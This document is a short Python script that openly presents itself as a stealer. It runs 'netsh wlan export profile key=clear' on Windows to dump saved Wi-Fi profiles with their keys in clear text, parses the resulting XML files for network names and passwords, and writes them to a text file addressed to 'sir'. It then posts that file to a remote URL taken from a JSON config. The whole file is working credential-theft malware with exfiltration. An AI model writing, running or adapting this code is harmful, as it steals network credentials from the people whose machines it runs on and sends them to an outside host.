import subprocess
import os
import sys
import json
import requests


#Stealer URL
x = open('data.json')
data = json.load(x)
url = data["url"]



#Create a file
password_file= open('passwords.txt', "w")
password_file.write("Hello sir, here are the passwords you wanted: \n\n")
password_file.close()


#lists 
wifi_files = []
wifi_name = []
wifi_password = []


#Use Python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Hack

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keymaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name , wifi_password):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: "+x, "Password: "+y, sep='\n')
                            sys.stdout.close()


#Send the details
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)








